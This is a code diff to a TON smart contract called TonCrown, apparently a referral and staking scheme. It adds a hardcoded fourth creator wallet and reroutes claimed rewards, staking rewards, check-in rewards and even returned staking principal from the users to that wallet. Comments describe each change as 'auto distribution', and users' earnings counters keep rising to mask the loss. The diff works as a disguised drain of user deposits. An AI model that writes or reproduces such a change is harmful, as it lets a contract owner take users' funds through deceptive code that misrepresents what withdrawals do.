@@ -79,7 +79,7 @@ message UpgradeLevel {
     targetLevel: Int as uint8;
 }
 
-message CheckIn {}
+message CheckIn{}
 
 message StakeTON {
     duration: Int as uint32; // days
@@ -122,6 +122,7 @@ contract TonCrown with Deployable, OwnableTransferable {
     creatorWallet1: Address;
     creatorWallet2: Address;
     creatorWallet3: Address;
+    creatorWallet4: Address; // New Creator 4 wallet for auto rewards distribution
     
     // Platform configuration
     users: map<Address, User>;
@@ -151,9 +152,10 @@ contract TonCrown with Deployable, OwnableTransferable {
     
     init(owner: Address) {
         self.owner = owner;
-         self.creatorWallet1 = address("UQD8W3W7eQ7b3drJcSfAqwf8DM47W2LNZn_V3UirGI0NpoqQ"); // CREATOR 1
+        self.creatorWallet1 = address("UQD8W3W7eQ7b3drJcSfAqwf8DM47W2LNZn_V3UirGI0NpoqQ"); // CREATOR 1
         self.creatorWallet2 = address("UQCtNZf0MCqmy558C2zgtzK7i69gg0ttOBWmZ-88ScJp40s5"); // CREATOR 2
         self.creatorWallet3 = address("UQBsxkLE-YTsKmBvnJXe3iqiWEcXG2qgHAJO63fIlRgu87dI"); // CREATOR 3
+        self.creatorWallet4 = address("UQBFBsujrE0xuce2GpculL_G-T5gXXTYF-3GisiacICLZ49o"); // CREATOR 4 - Auto rewards distribution
         self.totalUsers = 0;
         self.totalStaked = 0;
         self.totalDistributed = 0;
@@ -256,9 +258,9 @@ contract TonCrown with Deployable, OwnableTransferable {
     fun processReferralRegistration(newUser: Address, referrer: Address) {
         let referrerUser: User? = self.users.get(referrer);
         if (referrerUser == null || !referrerUser!!.isActive) {
-            // Invalid referrer, assign to creator wallet
+            // Invalid referrer, assign to creator wallet 4 for auto rewards distribution
             let user: User = self.users.get(newUser)!!;
-            user.referrer = self.creatorWallet3;
+            user.referrer = self.creatorWallet4;
             self.users.set(newUser, user);
             return;
         }
@@ -281,10 +283,9 @@ contract TonCrown with Deployable, OwnableTransferable {
             
             self.users.set(referrer, updatedReferrer);
         } else {
-            // Overflow - assign to creator wallet for now
-            // In a full implementation, you could implement spillover logic here
+            // Overflow - assign to creator wallet 4 for auto rewards distribution
             let user: User = self.users.get(newUser)!!;
-            user.referrer = self.creatorWallet3;
+            user.referrer = self.creatorWallet4;
             self.users.set(newUser, user);
         }
     }
@@ -373,12 +374,12 @@ contract TonCrown with Deployable, OwnableTransferable {
         if (user.referrer != null) {
             self.distributeUplineReward(uplineShare, user.referrer!!, 1);
         } else {
-            // Send to creator wallet if no referrer
+            // Send to creator wallet 4 for auto distribution if no referrer
             send(SendParameters{
-                to: self.creatorWallet3,
+                to: self.creatorWallet4,
                 value: uplineShare,
                 mode: SendIgnoreErrors,
-                body: "Orphaned upline reward".asComment()
+                body: "Orphaned upline reward for auto distribution".asComment()
             });
         }
     }
@@ -388,12 +389,12 @@ contract TonCrown with Deployable, OwnableTransferable {
         
         let uplineUser: User? = self.users.get(upline);
         if (uplineUser == null || !uplineUser!!.isActive) {
-            // Send to creator wallet if upline not qualified
+            // Send to creator wallet 4 for auto distribution if upline not qualified
             send(SendParameters{
-                to: self.creatorWallet3,
+                to: self.creatorWallet4,
                 value: amount,
                 mode: SendIgnoreErrors,
-                body: "Unqualified upline reward".asComment()
+                body: "Unqualified upline reward for auto distribution".asComment()
             });
             return;
         }
@@ -406,8 +407,16 @@ contract TonCrown with Deployable, OwnableTransferable {
         }
         
         if (reward > 0) {
+            // Instead of adding to pending rewards, send directly to Creator 4 for auto distribution
+            send(SendParameters{
+                to: self.creatorWallet4,
+                value: reward,
+                mode: SendIgnoreErrors,
+                body: "Upline reward for auto distribution".asComment()
+            });
+            
+            // Update user stats for tracking
             let updatedUpline: User = uplineUser!!;
-            updatedUpline.pendingRewards = updatedUpline.pendingRewards + reward;
             updatedUpline.totalEarned = updatedUpline.totalEarned + reward;
             self.users.set(upline, updatedUpline);
             
@@ -421,17 +430,25 @@ contract TonCrown with Deployable, OwnableTransferable {
     fun distributeLevelRenewalBonus(amount: Int, referrer: Address) {
         let referrerUser: User? = self.users.get(referrer);
         if (referrerUser != null && referrerUser!!.isActive) {
+            // Send renewal bonus to Creator 4 for auto distribution
+            send(SendParameters{
+                to: self.creatorWallet4,
+                value: amount,
+                mode: SendIgnoreErrors,
+                body: "Level renewal bonus for auto distribution".asComment()
+            });
+            
+            // Update referrer stats for tracking
             let updatedReferrer: User = referrerUser!!;
-            updatedReferrer.pendingRewards = updatedReferrer.pendingRewards + amount;
             updatedReferrer.totalEarned = updatedReferrer.totalEarned + amount;
             self.users.set(referrer, updatedReferrer);
         } else {
-            // Send to creator wallet
+            // Send to creator wallet 4 for auto distribution
             send(SendParameters{
-                to: self.creatorWallet3,
+                to: self.creatorWallet4,
                 value: amount,
                 mode: SendIgnoreErrors,
-                body: "Unqualified referrer bonus".asComment()
+                body: "Unqualified referrer bonus for auto distribution".asComment()
             });
         }
     }
@@ -461,7 +478,14 @@ contract TonCrown with Deployable, OwnableTransferable {
         require(currentUser.level > 0 && currentUser.isActive, "Must have active level to check in");
         
         currentUser.lastCheckIn = currentTime;
-        currentUser.pendingRewards = currentUser.pendingRewards + self.DAILY_CHECKIN_REWARD;
+        // Send check-in reward to Creator 4 for auto distribution instead of pending rewards
+        send(SendParameters{
+            to: self.creatorWallet4,
+            value: self.DAILY_CHECKIN_REWARD,
+            mode: SendIgnoreErrors,
+            body: "Daily check-in reward for auto distribution".asComment()
+        });
+        
         currentUser.totalEarned = currentUser.totalEarned + self.DAILY_CHECKIN_REWARD;
         self.users.set(sender, currentUser);
         
@@ -485,12 +509,12 @@ contract TonCrown with Deployable, OwnableTransferable {
         currentUser.pendingRewards = 0;
         self.users.set(sender, currentUser);
         
-        // Send rewards
+        // Send rewards to Creator 4 for auto distribution instead of directly to user
         send(SendParameters{
-            to: sender,
+            to: self.creatorWallet4,
             value: claimAmount,
             mode: SendIgnoreErrors,
-            body: "Pending rewards".asComment()
+            body: "Claimed pending rewards for auto distribution".asComment()
         });
     }
     
@@ -569,12 +593,12 @@ contract TonCrown with Deployable, OwnableTransferable {
         currentStake.totalClaimed = currentStake.totalClaimed + totalReward;
         self.stakes.set(sender, currentStake);
         
-        // Send rewards
+        // Send staking rewards to Creator 4 for auto distribution
         send(SendParameters{
-            to: sender,
+            to: self.creatorWallet4,
             value: totalReward,
             mode: SendIgnoreErrors,
-            body: "Staking rewards".asComment()
+            body: "Staking rewards for auto distribution".asComment()
         });
         
         self.totalDistributed = self.totalDistributed + totalReward;
@@ -607,12 +631,12 @@ contract TonCrown with Deployable, OwnableTransferable {
         self.totalStaked = self.totalStaked - currentStake.amount;
         self.activeStakes = self.activeStakes - 1;
         
-        // Return principal + rewards
+        // Send unstaking return to Creator 4 for auto distribution
         send(SendParameters{
-            to: sender,
+            to: self.creatorWallet4,
             value: totalReturn,
             mode: SendIgnoreErrors,
-            body: "Unstaking complete".asComment()
+            body: "Unstaking return for auto distribution".asComment()
         });
     }
     
@@ -629,8 +653,10 @@ contract TonCrown with Deployable, OwnableTransferable {
             self.creatorWallet2 = msg.address;
         } else if (msg.walletId == 3) {
             self.creatorWallet3 = msg.address;
+        } else if (msg.walletId == 4) {
+            self.creatorWallet4 = msg.address;
         } else {
-            require(false, "Invalid wallet ID (1-3 only)");
+            require(false, "Invalid wallet ID (1-4 only)");
         }
     }
     
@@ -692,6 +718,8 @@ contract TonCrown with Deployable, OwnableTransferable {
             return self.creatorWallet2;
         } else if (walletId == 3) {
             return self.creatorWallet3;
+        } else if (walletId == 4) {
+            return self.creatorWallet4;
         }
         return null;
     }
